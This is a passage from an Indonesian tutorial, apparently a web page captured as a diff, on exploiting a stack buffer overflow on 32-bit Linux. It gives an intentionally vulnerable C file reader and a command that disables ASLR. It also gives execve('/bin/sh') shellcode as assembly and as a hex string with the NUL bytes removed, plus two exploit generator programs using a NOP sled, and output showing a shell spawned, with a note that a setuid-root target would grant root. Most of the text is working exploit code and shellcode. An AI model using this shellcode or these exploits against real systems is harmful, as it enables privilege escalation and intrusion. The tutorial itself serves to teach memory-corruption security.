+<p>Fungsi <code>shell</code> tidak bisa kita eksekusi, karena kode program tersebut berusaha memodifikasi dirinya (memodifikasi pointer ke <code>names</code> yang berada di <em>code section</em>). Di berbagai OS hal tersebut tidak diijinkan, agar kode program boleh memodifikasi dirinya, kode tersebut perlu disalin ke <em>data section</em>. Dalam contoh yang saya buat, kode dari fungsi shell dicopy ke array data menggunakan <code>memcpy</code>. Untuk mendapatkan ukuran kode fungsi <code>shell</code>, pertama ukurannya diperkirakan dulu, lalu kita compile programnya, lihat besar sebenarnyafungsi <code>shell</code> (offset akhir fungsi minus offset awal), lalu ganti baris <code>#define CODE_SIZE xx</code> dengan nilai yang benar.</p>
+<h2><a name="index4h2"></a>Contoh eksploitasi</h2>
+<p>Untuk contoh, saya akan membuat program sederhana yang mengandung 
+buffer overflow. Program ini sangat sederhana: hanya membaca string nama
+ dari sebuah file <code>data.dat</code>, pertama program akan membaca 
+panjang nama, lalu membaca karakter namanya. Masalah dengan program ini 
+adalah: program tersebut tidak mengecek panjang nama sebelum membaca 
+data dari file. Program juga akan mencetak alamat variabel nama untuk 
+memudahkan eksploitasi.</p>
+<div class="highlight-c"><pre class="hl"><span class="hl com">/*load.c akan dikompilasi menjadi "load"*/</span>
+<span class="hl com">/*kompilasi dengan gcc -fno-stack-protector -z execstack load.c -o load*/</span>
+<span class="hl ppc">#include &lt;stdio.h&gt;</span>
+<span class="hl ppc">#include &lt;stdlib.h&gt;</span>
+<span class="hl ppc">#include &lt;string.h&gt;</span>
+
+<span class="hl kwb">void</span> <span class="hl kwd">load_file</span><span class="hl opt">(</span><span class="hl kwb">const char</span> <span class="hl opt">*</span>filename<span class="hl opt">)</span>
+<span class="hl opt">{</span>
+        <span class="hl kwb">int</span> namelen<span class="hl opt">;</span>
+        <span class="hl kwb">FILE</span> <span class="hl opt">*</span>f<span class="hl opt">;</span>
+        <span class="hl kwb">char</span> name<span class="hl opt">[</span><span class="hl num">128</span><span class="hl opt">];</span>
+
+        f <span class="hl opt">=</span> <span class="hl kwd">fopen</span><span class="hl opt">(</span>filename<span class="hl opt">,</span> <span class="hl str">"r"</span><span class="hl opt">);</span>
+        <span class="hl kwa">if</span> <span class="hl opt">(!</span>f<span class="hl opt">) {</span>
+                <span class="hl kwd">printf</span><span class="hl opt">(</span><span class="hl str">"error opening file"</span><span class="hl opt">);</span>
+                <span class="hl kwa">return</span><span class="hl opt">;</span>
+        <span class="hl opt">}</span>
+        <span class="hl kwd">fread</span><span class="hl opt">(&amp;</span>namelen<span class="hl opt">,</span> <span class="hl kwa">sizeof</span><span class="hl opt">(</span>namelen<span class="hl opt">),</span> <span class="hl num">1</span><span class="hl opt">,</span> f<span class="hl opt">);</span>
+    <span class="hl kwd">printf</span><span class="hl opt">(</span><span class="hl str">"len = %d</span><span class="hl esc">\n</span><span class="hl str">"</span><span class="hl opt">,</span> namelen<span class="hl opt">);</span>
+        <span class="hl kwd">memset</span><span class="hl opt">(</span>name<span class="hl opt">,</span> <span class="hl num">0</span><span class="hl opt">,</span> <span class="hl kwa">sizeof</span><span class="hl opt">(</span>name<span class="hl opt">));</span>
+        <span class="hl kwd">fread</span><span class="hl opt">(</span>name<span class="hl opt">,</span> namelen<span class="hl opt">,</span> <span class="hl num">1</span><span class="hl opt">,</span> f<span class="hl opt">);</span>
+        <span class="hl kwd">printf</span><span class="hl opt">(</span><span class="hl str">"name = %s</span><span class="hl esc">\n</span><span class="hl str">"</span><span class="hl opt">,</span> name<span class="hl opt">);</span>
+        <span class="hl kwd">printf</span><span class="hl opt">(</span><span class="hl str">"address of name = %p</span><span class="hl esc">\n</span><span class="hl str">"</span><span class="hl opt">,</span> name<span class="hl opt">);</span>
+<span class="hl opt">}</span>
+
+<span class="hl kwb">int</span> <span class="hl kwd">main</span><span class="hl opt">(</span><span class="hl kwb">int</span> argc<span class="hl opt">,</span> <span class="hl kwb">char</span> <span class="hl opt">*</span>argv<span class="hl opt">[])</span>
+<span class="hl opt">{</span>
+        <span class="hl kwd">load_file</span><span class="hl opt">(</span><span class="hl str">"data.dat"</span><span class="hl opt">);</span>
+<span class="hl opt">}</span>
+</pre></div>
+<blockquote><p>Meskipun contoh bug ini kelihatan agak mengada-ada, namun bug semacam ini ditemukan di beberapa game dalam penanganan <em>savegame</em>. Bahkan beberapa game console berhasil dihack karena bug semacam ini.</p></blockquote>
+<p>Saya akan menggambarkan kira-kira posisi stack fungsi <code>load_file</code>, tapi tidak dengan alamat mutlak.</p>
+
+<p><img src="Shellcode_files/ditaa-shell-1.png" alt="ditaa-shell-1.png"></p>
+<p>Sebenarnya urutan variabel di stack tidak harus selalu <code>namelen</code>, <code>f</code>, lalu <code>name</code>. Compiler bebas memilih letak variabel. Jadi bisa saja seperti ini:</p>
+
+<p><img src="Shellcode_files/ditaa-shell-1a.png" alt="ditaa-shell-1a.png"></p>
+<p>Teorinya untuk bisa menginjeksikan kode, kita ingin menaruh kode kita di <code>name[0]</code> dan seterusnya sampai panjangnya kode. Selain itu kita ingin menimpa alamat kembali supaya menunjuk ke <code>name[0]</code></p>
+
+<p><img src="Shellcode_files/ditaa-shell-2.png" alt="ditaa-shell-2.png"></p>
+<p>Bagaimana kita bisa tahu alamat absolut <code>name[0]</code> di memori? dalam contoh ini sangat mudah, karena program yang dieksploitasi mencetak alamat variabel <code>name</code> (setelah teks <code>address of name</code>). Untuk program yang <em>real</em> kita perlu memperbaiki exploit kita (akan dijelaskan di bagian lain).</p>
+<blockquote><p>Perhatikan bahwa di OS modern, <em>Address Space Layout Randomization</em>
+ diaktifkan secara default, ini akan menyebabkan posisi stack selalu 
+berubah ketika program dieksekusi (menyulitkan eksploit). Di Linux, 
+untuk menonaktifkan proteksi tersebut, gunakan perintah (sebagai root):
+echo "0" &gt; /proc/sys/kernel/randomize_va_space</p></blockquote>
+<p>Untuk membuat exploit, kita perlu membuat file data yang berisi 
+integer yang menyatakan panjang string (panjangnya harus &gt; 128 agar 
+menimpa return address). Bagian awal nama berisi <em>shellcode</em> yang akan dieksekusi, dan bagian akhir (yang menimpa <em>return address</em>) perlu kita isi dengan alamat <code>name</code>.</p>
+<p>Pertama kita buat dulu program sederhana yang akan menyimpan <code>name</code> yang hanya berupa string "Jonathan".</p>
+<div class="highlight-c"><pre class="hl"><span class="hl com">/*save.c akan dikompilasi menjadi "save"*/</span>
+<span class="hl ppc">#include &lt;stdio.h&gt;</span>
+<span class="hl ppc">#include &lt;string.h&gt;</span>
+
+<span class="hl kwb">int</span> <span class="hl kwd">main</span><span class="hl opt">(</span><span class="hl kwb">int</span> argc<span class="hl opt">,</span> <span class="hl kwb">char</span> <span class="hl opt">*</span>argv<span class="hl opt">[])</span>
+<span class="hl opt">{</span>
+        <span class="hl kwb">char</span> data<span class="hl opt">[] =</span> <span class="hl str">"Jonathan"</span><span class="hl opt">;</span>
+        <span class="hl kwb">int</span> len<span class="hl opt">;</span>
+        <span class="hl kwb">FILE</span> <span class="hl opt">*</span>f<span class="hl opt">;</span>
+
+        len <span class="hl opt">=</span> <span class="hl kwd">strlen</span><span class="hl opt">(</span>data<span class="hl opt">);</span>
+        <span class="hl kwd">printf</span><span class="hl opt">(</span><span class="hl str">"len = %d</span><span class="hl esc">\n</span><span class="hl str">"</span><span class="hl opt">,</span> len<span class="hl opt">);</span>
+        f <span class="hl opt">=</span> <span class="hl kwd">fopen</span><span class="hl opt">(</span><span class="hl str">"data.dat"</span><span class="hl opt">,</span> <span class="hl str">"w"</span><span class="hl opt">);</span>
+        <span class="hl kwd">fwrite</span><span class="hl opt">(&amp;</span>len<span class="hl opt">,</span> <span class="hl kwa">sizeof</span><span class="hl opt">(</span>len<span class="hl opt">),</span> <span class="hl num">1</span><span class="hl opt">,</span> f<span class="hl opt">);</span>
+        <span class="hl kwd">fwrite</span><span class="hl opt">(</span>data<span class="hl opt">,</span> len<span class="hl opt">,</span> <span class="hl num">1</span><span class="hl opt">,</span> f<span class="hl opt">);</span>
+        <span class="hl kwd">fclose</span><span class="hl opt">(</span>f<span class="hl opt">);</span>
+<span class="hl opt">}</span>
+</pre></div>
+<p>Ketika program itu dijalankan, maka file <code>data.dat</code> akan tercipta. Dan ketika <code>load</code> dijalankan:</p>
+<pre><code> yohanes@development:~$ ./load
+ len = 8
+ name = Jonathan
+ address of name = 0xbffff778
+</code></pre>
+<p>Coba jalankan beberapa kali, jika <code>address of name</code> berubah, artinya ASLR aktif (non aktifkan dulu untuk mencoba sisa artikel ini). Sekarang kita membuat program eksploit:</p>
+<div class="highlight-c"><pre class="hl"><span class="hl com">/*save-exploit.c</span>
+<span class="hl com">Compile dengan:  gcc -fomit-frame-pointer save-exploit.c -o save-exploit</span>
+<span class="hl com">*/</span>
+<span class="hl ppc">#include &lt;stdio.h&gt;</span>
+<span class="hl ppc">#include &lt;string.h&gt;</span>
+
+
+<span class="hl kwb">void</span> <span class="hl kwd">shell</span><span class="hl opt">()</span>
+<span class="hl opt">{</span>
+        __asm__ <span class="hl kwc">volatile</span> <span class="hl opt">(</span>
+             <span class="hl str">"call .start</span> <span class="hl esc">\n</span><span class="hl str">"</span>
+
+             <span class="hl str">".start:</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"pop  %eax</span> <span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"addl  $(.names-.start), %eax</span> <span class="hl esc">\n</span><span class="hl str">"</span>              <span class="hl slc">//N adalah jumlah byte dari start sampai name[0]</span>
+             <span class="hl str">"mov  %eax, %ecx</span><span class="hl esc">\n</span><span class="hl str">"</span>            <span class="hl slc">// sekarang %ecx berisi alamat name[0]</span>
+             <span class="hl str">"subl $8, %eax</span><span class="hl esc">\n</span><span class="hl str">"</span>               <span class="hl slc">// mundur 8 byte</span>
+             <span class="hl str">"movl %eax, (%ecx)</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"movl %eax, %ebx</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"xorl %edx, %edx</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"movl $11, %eax</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"int $0x80</span><span class="hl esc">\n</span><span class="hl str">"</span>
+              <span class="hl str">".string</span> <span class="hl esc">\"</span><span class="hl str">/bin/sh</span><span class="hl esc">\" \n</span><span class="hl str">"</span> <span class="hl slc">//               -&gt; string</span>
+             <span class="hl str">".names:"</span>
+             <span class="hl str">".long 0</span><span class="hl esc">\n</span><span class="hl str">"</span> <span class="hl slc">//         -&gt; ukurannya 4 byte</span>
+             <span class="hl str">".long 0</span><span class="hl esc">\n</span><span class="hl str">"</span> <span class="hl slc">//                        -&gt; ukurannya 4 byte</span>
+        <span class="hl opt">);</span>
+<span class="hl opt">}</span>
+<span class="hl ppc">#define CODE_SIZE 48</span>
+
+<span class="hl kwb">int</span> <span class="hl kwd">main</span><span class="hl opt">(</span><span class="hl kwb">int</span> argc<span class="hl opt">,</span> <span class="hl kwb">char</span> <span class="hl opt">*</span>argv<span class="hl opt">[])</span>
+<span class="hl opt">{</span>
+        <span class="hl kwb">char</span> data<span class="hl opt">[</span><span class="hl num">128</span><span class="hl opt">+</span><span class="hl num">32</span><span class="hl opt">];</span>
+        <span class="hl kwb">int</span> len <span class="hl opt">=</span> <span class="hl num">128</span> <span class="hl opt">+</span> <span class="hl num">32</span><span class="hl opt">;</span>
+        <span class="hl kwb">FILE</span> <span class="hl opt">*</span>f<span class="hl opt">;</span>
+        <span class="hl kwb">int</span> i<span class="hl opt">;</span>
+        <span class="hl kwb">int</span> <span class="hl opt">*</span>data_as_int<span class="hl opt">;</span>
+        <span class="hl kwb">unsigned int</span> return_address<span class="hl opt">;</span>
+
+        <span class="hl kwa">if</span> <span class="hl opt">(</span>argc<span class="hl opt">&lt;</span><span class="hl num">2</span><span class="hl opt">) {</span>
+                <span class="hl kwd">printf</span><span class="hl opt">(</span><span class="hl str">"usage: save-exploit &lt;address&gt;"</span><span class="hl opt">);</span>
+                <span class="hl kwa">return</span> <span class="hl num">0</span><span class="hl opt">;</span>
+        <span class="hl opt">}</span>
+
+        return_address <span class="hl opt">=</span> <span class="hl kwd">strtoul</span><span class="hl opt">(</span>argv<span class="hl opt">[</span><span class="hl num">1</span><span class="hl opt">],</span> <span class="hl num">0</span><span class="hl opt">,</span> <span class="hl num">16</span><span class="hl opt">);</span>
+
+        <span class="hl kwd">printf</span><span class="hl opt">(</span><span class="hl str">"using return address %08x</span><span class="hl esc">\n</span><span class="hl str">"</span><span class="hl opt">,</span> return_address<span class="hl opt">);</span>
+        <span class="hl kwd">memset</span><span class="hl opt">(</span>data<span class="hl opt">,</span> <span class="hl num">0x90</span><span class="hl opt">,</span> <span class="hl kwa">sizeof</span><span class="hl opt">(</span>data<span class="hl opt">));</span>
+        <span class="hl kwd">memcpy</span><span class="hl opt">(</span>data<span class="hl opt">,</span> shell<span class="hl opt">,</span> CODE_SIZE<span class="hl opt">);</span>
+
+        data_as_int <span class="hl opt">= (</span><span class="hl kwb">int</span> <span class="hl opt">*)(</span>data <span class="hl opt">+</span> <span class="hl num">128</span><span class="hl opt">);</span>
+
+        <span class="hl kwa">for</span><span class="hl opt">(</span>i<span class="hl opt">=</span><span class="hl num">0</span><span class="hl opt">;</span> i<span class="hl opt">&lt;</span><span class="hl num">8</span><span class="hl opt">;</span> i<span class="hl opt">++) {</span>
+                data_as_int<span class="hl opt">[</span>i<span class="hl opt">] =</span> return_address<span class="hl opt">;</span>
+        <span class="hl opt">}</span>
+
+        f <span class="hl opt">=</span> <span class="hl kwd">fopen</span><span class="hl opt">(</span><span class="hl str">"data.dat"</span><span class="hl opt">,</span> <span class="hl str">"w"</span><span class="hl opt">);</span>
+        <span class="hl kwd">printf</span><span class="hl opt">(</span><span class="hl str">"len = %d</span><span class="hl esc">\n</span><span class="hl str">"</span><span class="hl opt">,</span> len<span class="hl opt">);</span>
+        <span class="hl kwd">fwrite</span><span class="hl opt">(&amp;</span>len<span class="hl opt">,</span> <span class="hl kwa">sizeof</span><span class="hl opt">(</span>len<span class="hl opt">),</span> <span class="hl num">1</span><span class="hl opt">,</span> f<span class="hl opt">);</span>
+        <span class="hl kwd">fwrite</span><span class="hl opt">(</span>data<span class="hl opt">,</span> len<span class="hl opt">,</span> <span class="hl num">1</span><span class="hl opt">,</span> f<span class="hl opt">);</span>
+        <span class="hl kwd">fclose</span><span class="hl opt">(</span>f<span class="hl opt">);</span>
+<span class="hl opt">}</span>
+</pre></div>
+<p>Bagian fungsi <code>shell</code> sudah dibahas, jadi saya akan masuk ke fungsi <code>main</code> saja. Buffer <code>name</code> mampu menampung 128 byte. Kita menambahkan 32 byte yang akan kita isi dengan alamat <code>address of name</code>.
+ Seharusnya kita cukup menimpa EBP dan return address (masing-masing 4 
+byte, jadi totalnya 8 byte), tapi karena kemungkinan adanya 
+padding/alignment oleh compiler, dan ada kemungkinan bahwa urutan 
+variabelnya dibalik oleh compiler di stack, maka untuk amannya saya 
+menggunakan 32 byte (toh kalau berlebihpun tidak apa-apa). Saya 
+mengulangi nilai <code>return address</code> 8 kali, agar pasti berhasil menimpa <code>return address</code> di stack.</p>
+<p>Berdasarkan alamat yang didapat dari program <code>load</code>:</p>
+<pre><code> yohanes@development:~$ ./save-exploit  bffff778
+ using return address bffff778
+ len = 160
+</code></pre>
+<p>Nah sekarang kita jalankan program <code>load</code> sekali lagi:</p>
+<pre><code> yohanes@development:~$ ./load
+ len = 160
+ name = �
+          address of name = 0xbffff778
+ sh-3.2$
+</code></pre>
+<p>Perhatikan bahwa kita berhasil menjalankan <em>shell</em>. Andaikan program <code>load</code> merupakan program <em>setuid root</em>, maka kita sudah mendapatkan akses root.</p>
+<h2><a name="index5h2"></a>Exploit yang reliable</h2>
+<p>Ada beberapa masalah dengan kode eksploit yang saya jelaskan. Pertama
+ adalah: kode tersebut mengandung karakter '\0' atau NUL. Dalam kasus 
+fungsi <code>fread</code> semua byte akan dibaca atau <code>memcpy</code> semua byte akan dicopy (sesuai ukurannya). Tapi dalam kasus manipulasi string (<code>strcpy</code>, <code>strcat</code>,
+ dsb), byte 0 akan menghentikan proses penyalinan atau pemrosesan 
+karakter. Jadi target pertama untuk exploit yang lebih reliable adalah 
+membuat shellcode yang bisa dipakai di berbagai konteks.</p>
+<p>Masalah berikutnya adalah: menentukan alamat variabel di stack. Di 
+program sebelumnya, program yang dieksploitasi "memberi tahu" posisi 
+stack variabel. Di <em>real world</em> tentunya program tidak akan melakukan hal itu (kecuali )</p>
+<p>Kita coba selesaikan masalah pertama: menghilangkan NUL dari shellcode. Jika kita lihat shellcode saat ini:</p>
+<pre><code> 080483f4 &lt;shell&gt;:
+  80483f4:       e8 00 00 00 00          call   80483f9 &lt;.start&gt;
+
+ 080483f9 &lt;.start&gt;:
+  80483f9:       58                      pop    %eax
+  80483fa:       05 20 00 00 00          add    $0x20,%eax
+  80483ff:       89 c1                   mov    %eax,%ecx
+  8048401:       83 e8 08                sub    $0x8,%eax
+  8048404:       89 01                   mov    %eax,(%ecx)
+  8048406:       89 c3                   mov    %eax,%ebx
+  8048408:       31 d2                   xor    %edx,%edx
+  804840a:       b8 0b 00 00 00          mov    $0xb,%eax
+  804840f:       cd 80                   int    $0x80
+</code></pre>
+<p>Ada banyak byte <code>00</code> di situ:</p>
+<pre><code> e8 00 00 00 00          call   80483f9 &lt;.start&gt;
+ ...
+ 05 20 00 00 00          add    $0x20,%eax
+ ...
+ b8 0b 00 00 00          mov    $0xb,%eax
+</code></pre>
+<p>Ada beberapa byte 0 di data: "/bin/sh" diterminasi oleh byte '\0' ), lalu array <code>names</code> juga perlu berisi 0 di <code>names[1]</code>.</p>
+<p>Untuk instruksi pertama, ini bisa diatasi dengan sedikit trik: ini memerlukan pemahaman <code>instruction encoding</code> prosessor. Singkatnya begini: <code>call</code>
+ diikuti alamat relatif dari posisi saat ini. Dalam contoh ini, call 
+akan menuju ke 0 byte (sehingga kode setelah e8 adalah 00 00 00 00) 
+setelah instruksi saat ini. Jika instruksi yang dicall adalah sebelum 
+posisi saat ini, maka offsetnya negatif. Instruksi <code>mov $0xb,%eax bisa diganti dengan dua instruksi:</code>xorl %eax, %eax<code>dan</code>addb $11, %al<code>(atau</code>movb $11, %al`).</p>
+<p>Sekarang semua instruksi sudah bebas dari byte 0 . masalah lain 
+adalah data: string "/bin/sh" diterminasi dengan '\0'. Kita perlu 
+mengeset karakter ini dari kode. Hasil akhir adalah:</p>
+<div class="highlight-c"><pre class="hl"><span class="hl kwb">void</span> <span class="hl kwd">shell</span><span class="hl opt">()</span>
+<span class="hl opt">{</span>
+        __asm__ <span class="hl kwc">volatile</span> <span class="hl opt">(</span>
+             <span class="hl str">"jmp .done</span><span class="hl esc">\n</span><span class="hl str">"</span>
+
+             <span class="hl str">".start:</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"pop  %eax</span> <span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"leal 0x8(%eax), %ecx</span><span class="hl esc">\n</span><span class="hl str">"</span>        <span class="hl slc">// sekarang %ecx berisi alamat name[0]</span>
+             <span class="hl str">"movl %eax, (%ecx)</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"movl %eax, %ebx</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"xorl %edx, %edx</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"movb %dl, 0x7(%eax)</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"movl %edx, 0xc(%eax)</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"xor %eax, %eax</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"movb $11, %al</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">"int $0x80</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">".done: call .start</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">".ascii</span> <span class="hl esc">\"</span><span class="hl str">/bin/sh</span><span class="hl esc">\" \n</span><span class="hl str">"</span> <span class="hl slc">//      -&gt; string</span>
+             <span class="hl str">".byte 0x90</span><span class="hl esc">\n</span><span class="hl str">"</span>
+             <span class="hl str">".names:"</span>
+             <span class="hl str">".long 0x90909090</span><span class="hl esc">\n</span><span class="hl str">"</span> <span class="hl slc">//         -&gt; ukurannya 4 byte</span>
+             <span class="hl str">".long 0x90909090</span><span class="hl esc">\n</span><span class="hl str">"</span> <span class="hl slc">//         -&gt; ukurannya 4 byte</span>
+             <span class="hl opt">);</span>
+
+<span class="hl opt">}</span>
+</pre></div>
+<p>Byte-byte terakhir saya isi dengan 0x90 (instruksi NOP), supaya bagus
+ jika didisassembly. Shellcode final yang akan diinjeksi ke program lain
+ tidak butuh itu.</p>
+<pre><code> 080483f4 &lt;shell&gt;:
+  80483f4:       eb 16                   jmp    804840c &lt;.done&gt;
+
+ 080483f6 &lt;.start&gt;:
+  80483f6:       58                      pop    %eax
+  80483f7:       8d 48 08                lea    0x8(%eax),%ecx
+  80483fa:       89 01                   mov    %eax,(%ecx)
+  80483fc:       89 c3                   mov    %eax,%ebx
+  80483fe:       31 d2                   xor    %edx,%edx
+  8048400:       88 50 07                mov    %dl,0x7(%eax)
+  8048403:       89 50 0c                mov    %edx,0xc(%eax)
+  8048406:       31 c0                   xor    %eax,%eax
+  8048408:       b0 0b                   mov    $0xb,%al
+  804840a:       cd 80                   int    $0x80
+
+ 0804840c &lt;.done&gt;:
+  804840c:       e8 e5 ff ff ff          call   80483f6 &lt;.start&gt;
+  8048411:       2f                      das
+  8048412:       62 69 6e                bound  %ebp,0x6e(%ecx)
+  8048415:       2f                      das
+  8048416:       73 68                   jae    8048480 &lt;__libc_csu_init&gt;
+  8048418:       90                      nop
+
+ 08048419 &lt;.names&gt;:
+  8048419:       90                      nop
+  804841a:       90                      nop
+  804841b:       90                      nop
+  804841c:       90                      nop
+  804841d:       90                      nop
+  804841e:       90                      nop
+  804841f:       90                      nop
+  8048420:       90                      nop
+</code></pre>
+<p>Bagian label <code>.done</code> berisi instruksi aneh, karena 
+sebenarnya itu berisi data ("/bin/sh"). Shell code yang kita butuhkan 
+adalah semua byte sebelum nop pertama dalam listing tersebut:</p>
+<pre><code>   eb 16
+   58
+   8d 48 08
+   89 01
+   89 c3
+   31 d2
+   88 50 07
+   89 50 0c
+   31 c0
+   b0 0b
+   cd 80
+   e8 e5 ff ff ff
+   2f
+   62 69 6e
+   2f
+   73 68
+</code></pre>
+<p>Lebih bagus lagi jika dilihat horizontal:</p>
+<pre><code>    eb 16 58 8d 48 08 89 01 89 c3 31 d2 88 50 07 89 50 0c 31 c0 b0 0b cd 80 e8 e5 ff ff ff 2f 62 69 6e 2f 73 68
+</code></pre>
+<p>Kita bisa menuliskannya sebagai array of character di C:</p>
+<pre><code>  char shell[] = {
+      0xeb, 0x16, 0x58, 0x8d, 0x48, 0x08, 0x89, 0x01, 0x89, 0xc3, 0x31, 0xd2,
+      0x88, 0x50, 0x07, 0x89, 0x50, 0x0c, 0x31, 0xc0, 0xb0, 0x0b, 0xcd, 0x80,
+      0xe8, 0xe5, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68
+  };
+</code></pre>
+<p>Atau biasanya orang lain lebih suka menulis dalam bentuk string C:</p>
+<pre><code>  char shell[] =
+      "\xeb\x16\x58\x8d\x48\x08\x89\x01\x89\xc3\x31\xd2"
+      "\x88\x50\x07\x89\x50\x0c\x31\xc0\xb0\x0b\xcd\x80"
+      "\xe8\xe5\xff\xff\xff/bin/sh";
+</code></pre>
+<p>Sekarang kita ke masalah berikutnya: Menentukan alamat suatu variabel
+ dengan benar. Menentukan alamat variabel dengan benar memang sangat 
+sulit, yang bisa kita lakukan adalah mengira-ngira.Coba kita lihat lagi 
+gambar sebelumnya, tapi saya tambahkan kemungkinan yang terjadi jika 
+kita memberi tebakan alamat kembalian:</p>
+
+<p><img src="Shellcode_files/ditaa-shell-3.png" alt="ditaa-shell-3.png"></p>
+<p>Kemungkinannya adalah:</p>
+<ul>
+<li>Kasus A: tebakan kita tepat benar, shellcode akan dieksekusi</li>
+<li>Kasus B: tebakan kita salah, kita menunjuk ke variabel lain di stack</li>
+<li>Kasus C: tebakan kita hampir benar, tapi mungkin terlewat beberapa byte</li>
+<li>Kasus D dan E: tebakan kita meleset jauh, terlalu rendah atau tinggi</li>
+</ul>
+<p>Di sistem yang tidak memakai proteksi ASLR, alamat stack bisa kita 
+perkirakan. Caranya mudah: coba buat program kecil, dan lihat alamat 
+variabel lokal di program saat ini. Program lain akan memiliki alamat 
+serupa. Dalam kasus A, D, dan E, tidak ada yang bisa kita lakukan (kita 
+meleset jauh dari shellcode). Dalam kasus B, jika beruntung maka 
+shellcode akan bisa dieksekusi (misalnya kebetulan nilainya <code>namelen</code> dan <code>f</code> adalah instruksi yang tidak membuat crash, maka kode di <code>name[0]</code>).</p>
+<p>Dalam shellcode sebelumnya, saya menaruh awal shellcode di awal 
+buffer. Jika alamat kembali ternyata meleset, maka prosessor akan 
+mengeksekusi kode tidak dari awal. Untuk memperbesar kemungkinan sukses,
+ kita bisa membuat supaya shellcode diawali dengan instruksi NOP (no 
+operation, yang tidak melakukan apa-apa). Strateginya begini:</p>
+
+<p><img src="Shellcode_files/ditaa-shell-4.png" alt="ditaa-shell-4.png"></p>
+<p>Dalam kasus C, jika alamat kembali salah, dan misalnya kita mendarat 
+di name[1], maka kode shell akan tetap berjalan. Jika meleset ke name[2]
+ atau name[3] dst pun masih akan berjalan, asalkan mendarat di posisi 
+NOP.</p>
+<div class="highlight-c"><pre class="hl"><span class="hl com">/*save-exploit-v2.c</span>
+<span class="hl com">Compile dengan:  gcc -fomit-frame-pointer save-exploit-v2.c -o save-exploit-v2</span>
+<span class="hl com">*/</span>
+<span class="hl ppc">#include &lt;stdio.h&gt;</span>
+<span class="hl ppc">#include &lt;string.h&gt;</span>
+
+
+<span class="hl kwb">char</span> shell<span class="hl opt">[] =</span>
+          <span class="hl str">"</span><span class="hl esc">\xeb\x16\x58\x8d\x48\x08\x89\x01\x89\xc3\x31\xd2</span><span class="hl str">"</span>
+          <span class="hl str">"</span><span class="hl esc">\x88\x50\x07\x89\x50\x0c\x31\xc0\xb0\x0b\xcd\x80</span><span class="hl str">"</span>
+          <span class="hl str">"</span><span class="hl esc">\xe8\xe5\xff\xff\xff</span><span class="hl str">/bin/sh"</span><span class="hl opt">;</span>
+
+<span class="hl ppc">#define BUFFER_SIZE 128</span>
+<span class="hl ppc">#define EXTRA_OVERFLOW 32</span>
+
+<span class="hl kwb">int</span> <span class="hl kwd">main</span><span class="hl opt">(</span><span class="hl kwb">int</span> argc<span class="hl opt">,</span> <span class="hl kwb">char</span> <span class="hl opt">*</span>argv<span class="hl opt">[])</span>
+<span class="hl opt">{</span>
+        <span class="hl kwb">char</span> data<span class="hl opt">[</span>BUFFER_SIZE <span class="hl opt">+</span> EXTRA_OVERFLOW<span class="hl opt">];</span>
+        <span class="hl kwb">int</span> len <span class="hl opt">=</span> BUFFER_SIZE <span class="hl opt">+</span> EXTRA_OVERFLOW<span class="hl opt">;</span>
+        <span class="hl kwb">FILE</span> <span class="hl opt">*</span>f<span class="hl opt">;</span>
+        <span class="hl kwb">int</span> i<span class="hl opt">;</span>
+        <span class="hl kwb">int</span> <span class="hl opt">*</span>data_as_int<span class="hl opt">;</span>
+        <span class="hl kwb">unsigned int</span> return_address<span class="hl opt">;</span>
+
+        <span class="hl kwa">if</span> <span class="hl opt">(</span>argc<span class="hl opt">&lt;</span><span class="hl num">2</span><span class="hl opt">) {</span>
+                <span class="hl kwd">printf</span><span class="hl opt">(</span><span class="hl str">"usage: save-exploit &lt;offsetguess&gt;"</span><span class="hl opt">);</span>
+                <span class="hl kwa">return</span> <span class="hl num">0</span><span class="hl opt">;</span>
+        <span class="hl opt">}</span>
+
+        return_address <span class="hl opt">= (</span><span class="hl kwb">int</span><span class="hl opt">)&amp;</span>data<span class="hl opt">[</span><span class="hl num">0</span><span class="hl opt">] +</span> <span class="hl kwd">atoi</span><span class="hl opt">(</span>argv<span class="hl opt">[</span><span class="hl num">1</span><span class="hl opt">]);</span>
+
+        <span class="hl kwd">printf</span><span class="hl opt">(</span><span class="hl str">"using return address %08x</span><span class="hl esc">\n</span><span class="hl str">"</span><span class="hl opt">,</span> return_address<span class="hl opt">);</span>
+        <span class="hl kwd">memset</span><span class="hl opt">(</span>data<span class="hl opt">,</span> <span class="hl num">0x90</span><span class="hl opt">,</span> <span class="hl kwa">sizeof</span><span class="hl opt">(</span>data<span class="hl opt">));</span>
+        <span class="hl kwd">memcpy</span><span class="hl opt">(</span>data <span class="hl opt">+ (</span>BUFFER_SIZE<span class="hl opt">-</span><span class="hl kwd">strlen</span><span class="hl opt">(</span>shell<span class="hl opt">)),</span> shell<span class="hl opt">,</span> <span class="hl kwd">strlen</span><span class="hl opt">(</span>shell<span class="hl opt">));</span>
+
+        data_as_int <span class="hl opt">= (</span><span class="hl kwb">int</span> <span class="hl opt">*)(</span>data <span class="hl opt">+</span> BUFFER_SIZE<span class="hl opt">);</span>
+
+        <span class="hl kwa">for</span><span class="hl opt">(</span>i<span class="hl opt">=</span><span class="hl num">0</span><span class="hl opt">;</span> i<span class="hl opt">&lt;(</span>EXTRA_OVERFLOW<span class="hl opt">)/</span><span class="hl kwa">sizeof</span><span class="hl opt">(</span>return_address<span class="hl opt">);</span> i<span class="hl opt">++) {</span>
+                data_as_int<span class="hl opt">[</span>i<span class="hl opt">] =</span> return_address<span class="hl opt">;</span>
